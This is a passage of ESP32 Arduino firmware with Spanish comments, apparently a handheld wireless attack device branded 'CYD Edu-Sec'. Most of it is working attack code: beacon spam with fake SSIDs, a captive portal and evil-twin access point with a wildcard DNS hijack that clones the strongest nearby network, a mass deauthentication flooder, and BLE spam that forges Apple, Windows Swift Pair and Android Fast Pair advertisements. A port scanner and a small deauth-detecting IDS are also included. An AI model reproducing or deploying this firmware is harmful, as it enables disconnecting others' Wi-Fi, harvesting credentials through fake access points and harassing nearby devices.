  tft.setTextFont(2);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("Inyectando balizas falsas...", 160, 105);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("SSIDs: FREE_WIFI | FBI_VAN | TROYANO...", 160, 130);
  drawBtn(100, 185, 120, 40, "PARAR", C_NEON_RED);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
}

void runBeaconSpam() {
  uint8_t ch = random(1, 13);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 5; i++) {
    uint8_t mac[6]; mac[0] = 0x02;
    for (int k = 1; k < 6; k++) mac[k] = random(256);
    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    int len = strlen(spamSSIDs[i]);
    beaconPacket[37] = len;
    memcpy(&beaconPacket[38], spamSSIDs[i], len);
    int ps = 38 + len;
    beaconPacket[ps] = 0x03; beaconPacket[ps+1] = 0x01; beaconPacket[ps+2] = ch;
    esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, ps + 3, false);
    delay(5);
  }
  if (tft.getTouch(&t_x, &t_y))
    if (touchIn(100, 185, 120, 40)) {
      touchRipple(160, 205, C_NEON_RED);
      esp_wifi_set_promiscuous(false);
      drawMenu();
    }
}

// ══════════════════════════════════════════════════════════════════
// MÓDULOS 4 y 8: PORTAL CAUTIVO y EVIL TWIN
// ══════════════════════════════════════════════════════════════════
void updatePortalScreen() {
  static int lastVictims = -1;
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate < 1000) return;
  lastUpdate = millis();

  int victims = WiFi.softAPgetStationNum();
  if (victims != lastVictims) {
    tft.fillRect(40, 138, 240, 22, C_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(2);
    if (victims > 0) {
      tft.setTextColor(C_YELLOW, C_BLACK);
      tft.drawString(">> Conectados: " + String(victims) + " <<", 160, 149);
    } else {
      tft.setTextColor(C_DARKGREY, C_BLACK);
      tft.drawString("Esperando conexiones...", 160, 149);
    }
    lastVictims = victims;
  }
}

void startPortal() {
  currentMode   = ATTACK_PORTAL;
  portalRunning = true;
  capturedPassword = "";
  evilTwinSSID  = "Free_WiFi";

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("AP: Free_WiFi", 160, 60);
  tft.setTextFont(2);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("DNS Hijack activo — 192.168.4.1", 160, 98);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("Esperando conexiones...", 160, 149);
  drawBtn(80, 200, 160, 40, "DETENER", C_NEON_RED);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP("Free_WiFi");
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.begin();
}

void stopPortal() {
  portalRunning = false;
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  drawMenu();
}

void startEvilTwin() {
  currentMode = ATTACK_EVIL_TWIN;
  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("EVIL TWIN", 160, 40);
  tft.setTextFont(2);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("Escaneando objetivos...", 160, 78);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();

  if (n > 0) {
    int bestIdx = 0;
    for (int i = 1; i < n; i++)
      if (WiFi.RSSI(i) > WiFi.RSSI(bestIdx)) bestIdx = i;
    evilTwinSSID = WiFi.SSID(bestIdx);
  } else {
    evilTwinSSID = "Red_Generica_AP";
    tft.setTextColor(C_ORANGE, C_BLACK);
    tft.drawString("Sin redes. Usando nombre generico.", 160, 100);
    delay(2000);
  }

  tft.fillRect(0, 65, 320, 75, C_BLACK);
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.drawString("Clonando: " + evilTwinSSID, 160, 78);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("Esperando conexiones...", 160, 149);
  drawBtn(80, 200, 160, 40, "DETENER", C_BLACK);

  portalRunning = true;
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(evilTwinSSID.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.begin();
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 5: MASS DEAUTH
// ══════════════════════════════════════════════════════════════════
void startDeauth() {
  currentMode = ATTACK_DEAUTH;
  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("DEAUTH ATTACK", 160, 45);
  tft.setTextFont(2);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("Mapeando redes objetivo...", 160, 85);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.scanNetworks();

  tft.fillRect(0, 75, 320, 25, C_BLACK);
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.drawString("INYECCION ACTIVA", 160, 85);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("Enviando Deauth Frames (Reason: 7)", 160, 108);
  drawBtn(100, 185, 120, 40, "PARAR", C_NEON_RED);
  esp_wifi_set_promiscuous(true);
}

void runDeauth() {
  int n = WiFi.scanComplete();
  if (n > 0) {
    for (int i = 0; i < n; i++) {
      uint8_t* bssid = WiFi.BSSID(i);
      int ch = WiFi.channel(i);
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      memcpy(&deauthPacket[10], bssid, 6);
      memcpy(&deauthPacket[16], bssid, 6);
      for (int j = 0; j < 3; j++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
      }
    }
  }
  if (tft.getTouch(&t_x, &t_y))
    if (touchIn(100, 185, 120, 40)) {
      touchRipple(160, 205, C_NEON_RED);
      esp_wifi_set_promiscuous(false);
      drawMenu();
    }
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 6: BLE SPAM (iOS / Windows / Android)
// ══════════════════════════════════════════════════════════════════
void startBLESpam() {
  currentMode    = ATTACK_BLE_SPAM;
  blePacketCount = 0;

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_RED, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("BLE SPAM", 160, 40);

  tft.setTextFont(1);
  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.drawString("SELECCIONAR TARGET:", 160, 75);

  drawBtnIcon(10,  85, 90, 38, ">>", "iOS",     bleTarget == 0 ? C_WHITE      : C_GREY);
  drawBtnIcon(115, 85, 90, 38, ">>", "Windows", bleTarget == 1 ? C_CYAN        : C_GREY);
  drawBtnIcon(220, 85, 90, 38, ">>", "Android", bleTarget == 2 ? C_NEON_GREEN  : C_GREY);

  tft.setTextFont(2);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("Paquetes: 0", 160, 143);
  drawBtn(100, 185, 120, 40, "PARAR", C_NEON_RED);

  // Limpiar instancia BLE anterior de forma segura
  if (pAdvertising != nullptr) {
    pAdvertising->stop();
    pAdvertising = nullptr;
  }
  BLEDevice::deinit(true);
  delay(100);                       // dar tiempo al stack BLE para liberar memoria

  BLEDevice::init("CYD_BLE");
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);
  pAdvertising->setMinPreferred(0x06);  // evitar que iOS filtre el paquete
}

// ── Helper: construir payload con tamaño mínimo garantizado ───────
// El ESP32 BLE stack requiere al menos 10 bytes en ManufacturerData.
// Rellenar con 0x00 hasta ese mínimo para evitar el crash.
String buildPayload(uint8_t* data, int len) {
  String s = "";
  for (int i = 0; i < len; i++) s += (char)data[i];
  // Padding hasta 10 bytes mínimo
  while (s.length() < 10) s += (char)0x00;
  return s;
}

void runBLESpam() {
  // ── Manejo de botones ─────────────────────────────────────────
  if (pressed) {
    if (touchIn(10,  85, 90, 38)) { bleTarget = 0; startBLESpam(); return; }
    if (touchIn(115, 85, 90, 38)) { bleTarget = 1; startBLESpam(); return; }
    if (touchIn(220, 85, 90, 38)) { bleTarget = 2; startBLESpam(); return; }
    if (touchIn(100, 185, 120, 40)) {
      touchRipple(160, 205, C_NEON_RED);
      if (pAdvertising != nullptr) { pAdvertising->stop(); pAdvertising = nullptr; }
      BLEDevice::deinit(true);
      delay(50);
      drawMenu();
      return;
    }
  }

  if (pAdvertising == nullptr) return;  // guardia: no crash si no inicializado

  // ── Construir payload según target ───────────────────────────
  String strPayload;

  if (bleTarget == 0) {
    // Apple iOS — Proximity Pairing (29 bytes, ya supera el mínimo)
    uint8_t p[] = {
      0x4C, 0x00, 0x0F, 0x19, 0x01, 0x02,
      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    p[5] = random(0x02, 0x15);   // modelo aleatorio (AirPods, Beats, etc.)
    strPayload = buildPayload(p, sizeof(p));

  } else if (bleTarget == 1) {
    // Windows Swift Pair — Company ID 0x0006 (Microsoft)
    // Estructura: Company ID (2) + Swift Pair subtype (1) + Reserved (1) + flags (1) + completion string (n)
    // Padding hasta 10 bytes para evitar crash del BLE stack
    uint8_t p[] = {
      0x06, 0x00,              // Company ID: Microsoft (little-endian)
      0x03,                    // Swift Pair subtype
      0x00,                    // reserved
      0x80,                    // flags: show popup
      0x43, 0x59, 0x44,        // "CYD" — nombre del dispositivo fantasma
      0x00, 0x00               // padding hasta 10 bytes mínimo
    };
    strPayload = buildPayload(p, sizeof(p));

  } else {
    // Android Fast Pair — Service UUID 0xFE2C (Google)
    // El payload Fast Pair va en Service Data, no en Manufacturer Data.
    // Usamos un Company ID ficticio con bytes del model ID de Google
    // para evitar que el BLE stack rechace el paquete por tamaño.
    uint8_t p[] = {
      0xE0, 0x00,              // Company ID: Google (little-endian)
      0x2C, 0xFE,              // Fast Pair Service marker
      0x71, 0x8F, 0x23,        // Model ID (Pixel Buds style)
      0x01, 0x00, 0x00         // padding hasta 10 bytes mínimo
    };
    strPayload = buildPayload(p, sizeof(p));
  }

  // ── Emitir el Advertising Packet ─────────────────────────────
  // Reusar el objeto BLEAdvertisementData en el heap (no en stack)
  // para evitar fragmentación en llamadas repetidas
  static BLEAdvertisementData* advData = nullptr;
  if (advData == nullptr) advData = new BLEAdvertisementData();

  advData->setManufacturerData(strPayload);
  pAdvertising->setAdvertisementData(*advData);
  pAdvertising->start();
  delay(30);
  pAdvertising->stop();

  // ── Actualizar contador cada 50 paquetes ──────────────────────
  blePacketCount++;
  if (blePacketCount % 50 == 0) {
    tft.fillRect(60, 136, 200, 16, C_BLACK);
    tft.setTextColor(C_YELLOW, C_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(2);
    tft.drawString("Paquetes: " + String(blePacketCount), 160, 143);
  }
}
// ══════════════════════════════════════════════════════════════════
// MÓDULO 7: PC SYNC
// ══════════════════════════════════════════════════════════════════
void handleSyncRoot() {
  String html =
    "<html><head>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}"
    "h2{color:#0f0;}a{color:#f00;font-size:16px;text-decoration:none;}"
    "li{margin:12px 0;border-bottom:1px solid #333;padding-bottom:8px;}"
    ".sz{color:#666;font-size:12px;}</style></head><body>"
    "<h2>&#128190; CYD Edu-Sec v2.1 — Evidencias Forenses</h2><ul>";
  File root = SD.open("/");
  File file = root.openNextFile();
  while (file) {
    if (!file.isDirectory())
      html += "<li><a href='/" + String(file.name()) + "'>" +
              String(file.name()) + "</a>"
              "<span class='sz'> (" + String(file.size()/1024) + " KB)</span></li>";
    file = root.openNextFile();
  }
  html += "</ul></body></html>";
  webServer.send(200, "text/html", html);
}

void handleSyncDownload() {
  File file = SD.open(webServer.uri());
  if (file && !file.isDirectory()) {
    webServer.streamFile(file, "application/octet-stream");
    file.close();
  } else {
    webServer.send(404, "text/plain", "No encontrado");
  }
}

void startSync() {
  currentMode = APP_SYNC;
  syncRunning = true;
  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_WHITE, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("PC SYNC MODE", 160, 45);
  tft.setTextFont(2);
  tft.drawString("1. Conecta al WiFi:", 160, 88);
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.drawString("CYD_SYNC", 160, 108);
  tft.setTextColor(C_WHITE, C_BLACK);
  tft.drawString("2. Abre el navegador:", 160, 140);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("http://192.168.4.1", 160, 160);
  drawBtn(80, 200, 160, 35, "CERRAR", C_NEON_RED);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP("CYD_SYNC");
  webServer.begin();
}

void stopSync() {
  syncRunning = false;
  webServer.stop();
  WiFi.softAPdisconnect(true);
  drawMenu();
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 9: LAN NMAP + SMARTCONFIG (con timeout 60 s)
// ══════════════════════════════════════════════════════════════════
int  nmap_ip_counter = 1;
int  nmap_y_pos      = 135;
int  nmap_found      = 0;
bool nmap_finished   = false;

void startNmap() {
  currentMode     = APP_NMAP;
  nmap_ip_counter = 1;
  nmap_y_pos      = 135;
  nmap_found      = 0;
  nmap_finished   = false;

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("LAN NMAP", 160, 40);

  if (WiFi.status() != WL_CONNECTED) {
    tft.setTextFont(2);
    tft.setTextColor(C_YELLOW, C_BLACK);
    tft.drawString("Iniciando SmartConfig...", 160, 75);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.drawString("Usa ESPTouch en tu celular", 160, 95);
    tft.setTextColor(C_DARKGREY, C_BLACK);
    tft.drawString("Timeout: 60s", 160, 112);
    drawBtn(100, 200, 120, 35, "CANCELAR", C_NEON_RED);

    WiFi.mode(WIFI_AP_STA);
    WiFi.beginSmartConfig();

    int dots = 0;
    unsigned long scStart = millis();
    while (!WiFi.smartConfigDone()) {
      if (millis() - scStart > 60000) {
        WiFi.stopSmartConfig();
        tft.fillRect(0, 120, 320, 28, C_BLACK);
        tft.setTextColor(C_NEON_RED, C_BLACK);
        tft.drawString("TIMEOUT — Volviendo...", 160, 133);
        delay(1800);
        drawMenu();
        return;
      }
      int remaining = 60 - (int)((millis() - scStart) / 1000);
      tft.fillRect(0, 120, 320, 28, C_BLACK);
      tft.setTextColor(C_WHITE, C_BLACK);
      String w = "Esperando";
      for (int d = 0; d <= dots % 3; d++) w += ".";
      w += "  [" + String(remaining) + "s]";
      tft.drawString(w, 160, 133);
      dots++;
      delay(500);
      if (tft.getTouch(&t_x, &t_y))
        if (touchIn(100, 200, 120, 35)) { WiFi.stopSmartConfig(); drawMenu(); return; }
    }

    tft.fillRect(0, 65, 320, 100, C_BLACK);
    tft.setTextColor(C_NEON_GREEN, C_BLACK);
    tft.drawString("Claves Recibidas!", 160, 95);
    int att = 0;
    while (WiFi.status() != WL_CONNECTED && att < 20) { delay(500); att++; }
    if (WiFi.status() != WL_CONNECTED) {
      tft.setTextColor(C_NEON_RED, C_BLACK);
      tft.drawString("ERROR DE RED", 160, 125);
      drawBtn(100, 200, 120, 35, "VOLVER", C_NEON_RED);
      nmap_finished = true;
      return;
    }
  }

  tft.fillRect(0, 55, 320, 85, C_BLACK);
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.drawString("IP: " + WiFi.localIP().toString(), 160, 75);
  tft.setTextColor(C_YELLOW, C_BLACK);
  tft.drawString("Escaneando puertos 80, 443...", 160, 100);
  drawBtn(200, 200, 100, 35, "PARAR", C_NEON_RED);
}

void runNmap() {
  if (nmap_finished) {
    if (pressed && touchIn(100, 200, 120, 35)) { WiFi.disconnect(); drawMenu(); }
    return;
  }
  if (pressed && touchIn(200, 200, 100, 35)) { WiFi.disconnect(); drawMenu(); return; }

  String ipBase = WiFi.localIP().toString();
  ipBase = ipBase.substring(0, ipBase.lastIndexOf('.') + 1);
  int ports[] = { 80, 443 };

  if (nmap_ip_counter <= 15 && nmap_y_pos < 188) {
    String targetIP = ipBase + String(nmap_ip_counter);
    tft.setTextDatum(TL_DATUM);
    tft.setTextFont(1);
    tft.fillRect(10, 118, 300, 10, C_BLACK);
    tft.setTextColor(C_DARKGREY, C_BLACK);
    tft.drawString(">> " + targetIP, 10, 118);
    for (int p = 0; p < 2; p++) {
      WiFiClient client;
      if (client.connect(targetIP.c_str(), ports[p], 500)) {
        tft.setTextColor(C_NEON_GREEN, C_BLACK);
        tft.drawString(targetIP + "  P" + String(ports[p]) + " OPEN", 10, nmap_y_pos);
        client.stop();
        nmap_y_pos += 12;
        nmap_found++;
      }
    }
    nmap_ip_counter++;
  } else {
    tft.fillRect(10, 118, 300, 10, C_BLACK);
    tft.setTextColor(C_CYAN, C_BLACK);
    tft.drawString("COMPLETADO — " + String(nmap_found) + " puertos abiertos", 10, 118);
    drawBtn(100, 200, 120, 35, "VOLVER", C_NEON_GREEN);
    nmap_finished = true;
  }
}

// ══════════════════════════════════════════════════════════════════
// MÓDULO 10: IDS — BLUE TEAM
// ══════════════════════════════════════════════════════════════════
void startIDS() {
  currentMode    = APP_IDS;
  idsRunning     = true;
  idsDeauthCount = 0;
  idsWindowStart = millis();

  tft.fillScreen(C_BLACK);
  dibujarBarraEstado();

  // Cabecera con color azul/cyan de defensa
  tft.drawFastHLine(0, 21, 320, C_CYAN);
  tft.setTextColor(C_CYAN, C_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.drawString("IDS — BLUE TEAM", 160, 42);

  tft.setTextFont(2);
  tft.setTextColor(C_NEON_GREEN, C_BLACK);
  tft.drawString("Monitoreando espectro 2.4 GHz...", 160, 78);
  tft.drawFastHLine(20, 92, 280, C_DARKGREY);

  tft.setTextColor(C_DARKGREY, C_BLACK);
  tft.setTextFont(1);
  tft.drawString("Deauth/2s : 0", 30, 105);
  tft.drawString("Estado    : NORMAL", 30, 118);
  tft.drawString("Canal     : --", 30, 131);

  drawBtn(80, 200, 160, 35, "VOLVER", C_GREY);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
}

void updateIDS() {
  if (pressed && touchIn(80, 200, 160, 35)) {
    esp_wifi_set_promiscuous(false);
    idsRunning = false;
    drawMenu();
    return;
  }

  if (millis() - idsWindowStart < 2000) return;
  idsWindowStart = millis();

  // Actualizar stats en pantalla
  tft.setTextFont(1);
  tft.setTextDatum(TL_DATUM);
  tft.fillRect(110, 100, 190, 42, C_BLACK);

  uint16_t deauthCol = idsDeauthCount > 5 ? C_NEON_RED : C_NEON_GREEN;
  tft.setTextColor(deauthCol, C_BLACK);
  tft.drawString(String(idsDeauthCount), 110, 105);

  tft.setTextColor(idsDeauthCount > 5 ? C_NEON_RED : C_NEON_GREEN, C_BLACK);
  tft.drawString(idsDeauthCount > 5 ? "!! ATAQUE DETECTADO !!" : "NORMAL", 110, 118);

  tft.setTextColor(C_CYAN, C_BLACK);
  tft.drawString("CH" + String(currentChannel), 110, 131);

  // Alerta visual si se detecta ataque
  if (idsDeauthCount > 5 && millis() - idsLastAlert > 4000) {
    idsLastAlert = millis();

    // Pantalla de alerta roja
    tft.fillRect(0, 25, 320, 165, C_NEON_RED);
    tft.setTextColor(C_WHITE, C_NEON_RED);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(4);
    tft.drawString("!! ALERTA !!", 160, 65);
    tft.setTextFont(2);
    tft.drawString("DEAUTH ATTACK detectado", 160, 105);
    tft.drawString(String(idsDeauthCount) + " tramas en 2 seg", 160, 128);
    tft.drawString("Posible: Deauth / Evil Twin", 160, 150);

    if (sdAvailable) {
      File log = SD.open("/ids_log.txt", FILE_APPEND);
      if (log) {
        log.println("[" + String(millis()/1000) + "s] ALERTA — " +
                    String(idsDeauthCount) + " Deauth/2s");
        log.close();
      }
    }
    delay(3000);
    startIDS();
    return;
  }

  idsDeauthCount = 0;

  // Channel hopping del IDS
  currentChannel++;
  if (currentChannel > 13) currentChannel = 1;
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  dibujarBarraEstado();
}

// ══════════════════════════════════════════════════════════════════
// UTILIDADES
// ══════════════════════════════════════════════════════════════════
void resetWiFi() {
  WiFi.disconnect(true);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  delay(100);
}

bool touchIn(int x, int y, int w, int h) {
  return (t_x > x && t_x < (x+w) && t_y > y && t_y < (y+h));
}
